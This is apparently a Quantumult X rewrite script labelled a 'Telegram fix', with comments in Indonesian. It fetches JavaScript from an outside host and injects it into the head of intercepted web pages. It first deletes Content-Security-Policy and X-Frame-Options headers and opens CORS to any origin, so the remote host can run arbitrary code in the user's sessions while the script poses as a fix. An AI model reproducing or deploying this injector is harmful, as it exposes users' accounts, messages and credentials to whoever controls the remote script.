/**
 * QUANTUMULT X INJECTOR - TELEGRAM FIX
 * URL: https://kaurev.cloud/1800879794/644054998f246062c84e5602158de18fd7d1d64caf26d5201f43957c07dc8aa5/install.user.js
 */

const INJECT_URL = "https://kaurev.cloud/1800879794/644054998f246062c84e5602158de18fd7d1d64caf26d5201f43957c07dc8aa5/install.user.js"; 
const FINAL_URL = INJECT_URL + "?t=" + Math.random();

$task.fetch({ url: FINAL_URL, timeout: 10 }).then(response => {
    let body = $response.body;
    let headers = $response.headers;

    if (headers) {
        // Hapus SEMUA jenis CSP agar bot Telegram bisa diakses
        Object.keys(headers).forEach(key => {
            if (key.toLowerCase().includes('content-security-policy') || 
                key.toLowerCase().includes('x-frame-options')) {
                delete headers[key];
            }
        });

        // Tambahkan header untuk mengizinkan akses ke API luar (CORS)
        headers['Access-Control-Allow-Origin'] = '*';
        headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
    }

    // Ambil isi script
    let injectCode = response.body;
    
    // Bungkus script agar dijalankan setelah DOM siap
    let scriptTag = `
<script type="text/javascript">
    (function() {
        const script = document.createElement('script');
        script.text = \`${injectCode}\`;
        document.head.appendChild(script);
    })();
</script>`;

    if (body && body.includes('<head>')) {
        body = body.replace('<head>', '<head>' + scriptTag);
    } else if (body) {
        body = scriptTag + body;
    }

    $done({ body: body, headers: headers });

}, reason => {
    $done({});
});
